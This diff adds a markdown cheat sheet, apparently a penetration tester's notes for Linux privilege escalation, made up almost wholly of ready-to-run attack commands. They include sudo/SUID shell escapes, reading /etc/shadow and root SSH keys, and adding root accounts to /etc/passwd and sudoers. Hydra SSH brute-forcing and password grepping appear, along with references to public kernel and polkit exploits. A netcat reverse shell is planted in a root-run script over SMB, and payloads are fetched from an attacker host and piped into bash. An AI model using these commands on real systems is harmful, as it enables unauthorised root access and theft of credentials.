@@ -1,0 +1,361 @@
+# Operator Quick Hits - S1R3N
+
+Condensed operator scratchpad retained because it is fast to grep and useful during live host work.
+Validate commands against context before copy/paste; many are intentionally terse.
+
+## Quick Hits
+
+---
+
+```bash
+===================================
+FIRST LOOK
+
+id
+whoami
+groups
+uname –a
+cat /etc/os-release
+file /bin/bash
+env
+alias ll='ls -lah --color=auto'
+searchsploit linux kernel ubuntu 16.04
+searchsploit linux kernel 1.2 debian priv esc
+searchsploit linux kernel | grep -v dos | grep ' 3\.' | grep -i 'root\|privilege\|exploit'
+linux-exploit-suggester.sh --uname <uname-a string>
+which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
+
+===================================
+USERS
+
+cat /etc/passwd
+grep -vE 'nologin|false' /etc/passwd
+su founduser (pw: founduser)
+ssh founduser@192.168.200.5
+hydra -f -V -I -t 50 -l founduser -P $commontenk 192.168.200.5 ssh
+ll /etc/passwd /etc/shadow
+
+===================================
+SUID
+
+sudo -l
+find / -perm -u=s -type f 2>/dev/null
+find / -perm -g=s -type f 2>/dev/null
+find / -perm /u=s,g=s -type f 2>/dev/null | sort
+
+===================================
+SUID TOOLS
+
+lse.sh -i -l1   ..finds unusual SUIDS
+https://gtfobins.github.io
+https://github.com/Anon-Exploiter/SUID3NUM/blob/master/suid3num.py
+
+ggtfobins --exploit shell --bins cpan,bash
+https://github.com/mzfr/gtfo
+gtfo -ls bins
+gtfo -b apt
+gtfo -ls exe
+gtfo -e leadvpack.dll
+
+===================================
+SUID EXAMPLES
+
+sudo -u bob /bin/bash
+sudo su
+sudo find . -exec /bin/sh -p \; -quit
+sudo time /bin/sh -p
+sudo vim -c ':!/bin/sh'
+sudo zsh
+sudo git branch --help config    ..small window then: \!/bin/dash
+sudo vim -c ':!/bin/sh'
+/usr/bin/bash -p
+/usr/bin/cp /tmp/newpasswd /etc/passwd
+/usr/sbin/start-stop-daemon -n foo -S -x /bin/sh -- -p
+
+CMD="/bin/sh";
+php7.2 -r "pcntl exec('/bin/sh', ['-p']);"
+
+/usr/bin/base32 /etc/shadow | /usr/bin/base32 --decode
+/usr/bin/base32 /root/.ssh/id_rsa | /usr/bin/base32 --decode
+vim id_rsa; chmod 600 id_rsa; ssh root@192.168.200.5 -i id_rsa
+
+LFILE='/etc/sudoers'
+/usr/bin/dosbox -c 'mount c /' -c "echo commander ALL=(ALL:ALL) ALL >>c:$LFILE" -c exit # May need to CTRL + C after
+sudo -s
+
+/usr/bin/gcore 493    ..to dump/catch password-store process
+ps -aux | grep pass   ..found root: /usr/bin/password-store
+strings core.493      ..created, even though errors
+
+Screen running as root
+export TERM=xterm
+screen -ls root/
+screen -x root/
+
+===================================
+ROOTBASH INJECTIONS
+
+SUID, Crons, Services, Not Full Path
+cat /home/user/overwrite.sh
+cat ./zabbix-service  ..calls 'systemctl'
+cat /usr/bin/pyscript.py
+/usr/bin/kick runs 'service apache2 start' ..w/o fullpath
+strings /usr/bin/kick  ..found 'service apache2 start'
+strace -v -f -e execve /usr/bin/kick 2>&1 | grep service
+echo $PATH
+
+SEE: mxrootbash
+
+===================================
+HUNT
+
+env
+cd /home; ll
+ls -lsaR /home/ 2>/dev/null
+cat /home/x/.bashrc
+cat /home/x/.*history
+find /home -name ".*history"
+
+ll ~/.ssh/
+ll /home/x/.ssh/
+ll /etc/ssh/ssh_config
+ll /etc/ssh/sshd_config
+
+ll /root
+ll /root/.ssh/
+cat /root/.*history
+
+ll /etc
+ll /etc/group
+grep -iR /etc .secret
+ll /etc/systemd/system/ | grep service
+ll /opt
+cd /var/mail; ll; cat www-data
+ll /var/spool/mail
+ll /var/lib
+ll /var/logs
+ll /usr/bin/pkexec
+
+ll /tmp
+ll /dev/shm
+ll /var/tmp
+ll /var/www
+ll /var/www/html
+ll /var/www/classes
+cat /etc/apache2/apache2.conf
+cat /etc/apache2/.htpasswd
+cat /etc/httpd/conf/httpd.conf
+cat /usr/local/etc/apache2/httpd.conf
+grep -i db_ /var/www/wp-config.php
+grep -i db_ /var/www/html/wp-config.php
+grep -R pass /etc/phpmyadmin/
+grep -i pass /etc/phpmyadmin/config-db.php
+
+ll /weird
+ll /backups
+ll /export
+ll /reports
+ll /var/backup
+ll /private
+
+tree -l
+find -L .
+find /weird -type f -follow -print
+find /weird -type f -follow -print|xargs ls -l
+
+find / -type f -user bob 2>/dev/null
+find / -type d -user bob 2>/dev/null
+
+LinEnum finds World Writable:
+/usr/lib/python2.7/os.py
+
+===================================
+DISK
+
+mount
+cat /etc/fstab
+ll /mnt
+cat /etc/sudoers
+lsblk
+lsmod
+
+env   ..paths/passwords/secrets
+echo $PATH | tr ':''\n'
+ls -lah /weird
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/games
+
+getcap -r / 2>/dev/null
+
+===================================
+INTERNALS
+
+ps aux | grep -i root --color=auto
+netstat -antup | grep 127
+nc -nv 127.0.0.1 25
+
+REF: mxpivot
+
+===================================
+NETWORKS
+
+ip a
+ifconfig
+ps -ef
+netstat -plantu | grep LIST
+ss -tulpn
+iptables -L
+grep -Hrs iptables /etc/
+tail /var/log/auth.log
+
+===================================
+WORDHUNT
+
+grep -i pass * -a3 -b3
+find . -print | grep -i password
+find . -print | grep -i 'user\|account\|config'
+find /home -name .bash_history -exec grep -A 1 '^passwd' {} \;
+find / 2>/dev/null | grep -i config > /var/tmp/config.txt
+grep -ri pass /home/ 2>/dev/null
+grep -lri pass ./ --exclude=*.jpg
+grep -ri pass ./ --exclude=*.jpg -A1 -B1
+grep -ri -e pass -e username -e db ./ -A1 -B1 *.txt *.ini
+grep -ri -e password -e username -e db ./ --exclude=*.jpg -A1 -B1 --color=always | more
+find . -type f 2>/dev/null \( -iname '*user*' -o -iname '*account*' -o -iname '*config*' -o -iname '*passw*' -o -iname '*root*' -o -iname 'web.config' -o -iname 'id_rsa' -o -iname 'grub.conf' -o -iname 'httpd.conf' -o -iname 'httpd.conf.ini' -o -iname 'inetd.conf' -o -iname 'lighttpd.conf' -o -iname 'lilo.conf' -o -iname 'modsec.conf' -o -iname 'modules.conf' -o -iname 'my.conf' -o -iname 'mysql_data.conf' -o -iname 'proftp.conf' -o -iname 'proftpd.conf' -o -iname 'pure-config.pl' -o -iname 'pure-ftpd.conf' -o -iname 'resolv.conf' -o -iname 'smb.conf' -o -iname 'snmpd.conf' -o -iname 'srm.conf' -o -iname 'ssh_config' -o -iname 'sshd_config' -o -iname 'syslog.conf' -o -iname 'vsftpd.conf' -o -iname 'db.php' -o -iname 'db.php5' -o -iname 'httpd.conf.php' -o -iname 'login.php' -o -iname '.php_history' -o -iname 'php.ini' -o -iname 'wp-config.php' -o -iname 'config.inc.php' -o -iname 'SAM$' -o -iname 'SYSTEM$' -o -iname 'SECURITY$' -o -iname 'ntds.dit' -o -iname 'adamntds.dit' -o -iname '.mysql_history' -o -iname '.nano_history' -o -iname '.bash_history' -o -iname '.psql_history' -o -iname '.zsh_history' \) | xargs -d '\n' grep -iEH 'ssh|pass|admin|root' 2>/dev/null
+
+===================================
+JOBS
+
+crontab -l
+cat /etc/crontab
+ll /etc/cron*
+crontab -u root -l
+grep "CRON" /var/log/cron.log
+find / -user root -writable -type f -not -path "/proc/*"  2>/dev/null
+watch -n 1 'systemctl list-timers'
+systemctl list-timers
+pidof X
+journalctl -f
+Tools: Linpeas, Procmon, pspy, lse
+
+===================================
+SHARED OBJECTS
+
+cat /etc/crontab
+/usr/bin/log-sweeper  ..try to execute
+"Shared Object" (so) file missing
+Error while loading shared libraries: utils.so
+Cannot open shared object file: No such file
+find / -type d -writable 2>/dev/null  ..look for writable directory
+
+===================================
+PROCMON
+
+#!/bin/bash
+IFS=$'\n'
+old_proc=$(ps -eo command)
+while true; do
+  new_process=$(ps -eo command)
+  diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
+  sleep 1
+  old_process=$new_process
+done
+
+===================================
+PASSWD
+
+openssl passwd -1 -salt aabbcc helps
+echo "mike:J5I78uqmxfVyw:0:0:root:/root:/bin/bash" >> /etc/passwd
+echo "mike:$1$aabbcc$ZgkDQ0ey.wFLZvfnboN311:0:0:mike:/home/mike:/bin/bash" >> /etc/passwd
+su - mike
+
+===================================
+DIR INJECTION
+
+Found SMB Share with "ITSHOP"
+Matches a log showing root executes "/home/bob/ITSHOP/script"
+echo "nc -nv 192.168.162.46 443 -e /bin/bash &" > script
+smbclient //192.168.200.5/ITDEPT
+put script
+
+===================================
+PWNKIT
+
+ll /usr/bin/pkexec
+-rwxr-xr-x 1 root root /usr/bin/pkexec  ..not vuln
+-rwsr--r-- 1 root root /usr/bin/pkexec  ..SUID vulnerable!
+https://github.com/arthepsy/CVE-2021-4034
+
+Baron Samedit (CVE-2021-3156)
+sudoedit -s /.     ...Vulnerable: if error sudoedit: /: not a regular file
+sudoedit -s /.     ...Not vuln: sudoedit usage results
+
+Polkit (CVE-2021-3650)
+https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
+wget http://192.168.162.46/cve-2021-3650.sh
+bash polkit.sh   ...try more than once
+su - secnigma
+pass: secnigmaftw
+sudo bash
+sudo su -
+
+===================================
+TOOLS
+
+cd /opt/linux_privesc
+sudo python3 -m http.server 80
+
+cd /var/tmp
+wget http://192.168.162.46:80/linpeas.sh                  ..best
+wget http://192.168.162.46:80/lse.sh                      ..compliment to linpeas
+wget http://192.168.162.46:80/pspy32                      ..crons
+wget http://192.168.162.46:80/suid3num.py                 ..suid check
+wget http://192.168.162.46:80/Linuxprivchecker.py         ..prefer
+wget http://192.168.162.46:80/LinEnum.sh                  ..second best
+wget http://192.168.162.46:80/unixprivesc.sh              ..maybe
+wget http://192.168.162.46:80/linux-exploit-suggester.sh  ..kernel exploits (dirtycow, rds, etc)
+wget -r http://192.168.162.46:80/ -P /var/tmp/            ..ALL
+curl 192.168.162.46:80/linux-exploit-suggester.sh | bash  ..autorun
+
+===================================
+SUGGESTER
+
+sudo python3 -m http.server 80
+./linux-exploit-suggester.sh
+
+uname -a
+kali> linux-exploit-suggester.sh --uname <uname-a string>
+
+lse.sh
+tries to gradualy expose the information depending on its privesc importance
+lse.sh -i -l1 2>&1 | tee lse.txt | less -r      ..level 1 Good
+lse.sh -i -l2 2>&1 | tee lse.txt | less -r      ..level 2 Deeper
+
+===================================
+RESULTS
+
+linpeas.sh -a > /var/tmp/linpeas.txt
+linpeas.sh 2>&1 | tee /var/tmp/linpeas.txt
+less -r /var/tmp/linpeas.txt
+
+Results to Kali
+kali> nc -lvnp 9090 > linpeas.txt
+linx> nc 192.168.162.46 9090 < linpeas.txt
+
+Send to Target
+scp pspy bob@192.168.200.5
+
+===================================
+UPDATES
+
+cd ~/tools/
+git clone https://github.com/mzet-/linux-exploit-suggester
+cp ./linux-exploit-suggester/linux-exploit-suggester.sh ./linux_privesc/
+
+cd ~/tools/linux_privesc
+wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh"
+
+===================================
+PROOF
+
+cat proof.txt && whoami && hostname && ip addr
+```
